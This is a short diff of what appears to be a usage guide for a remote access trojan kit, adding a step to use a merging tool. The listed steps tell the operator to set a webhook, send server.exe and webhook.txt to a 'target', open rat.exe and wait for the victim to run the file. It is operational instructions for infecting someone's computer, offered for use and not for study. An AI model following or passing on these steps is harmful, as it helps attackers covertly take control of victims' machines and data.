@@ -1,4 +1,4 @@
-1 edit webhook in webhook.txt
+1 edit webhook in webhook.txt and Use MERG.exe
 2 send server.exe and webhook.txt to target
 3 open rat.exe
 4 wait for target run file 
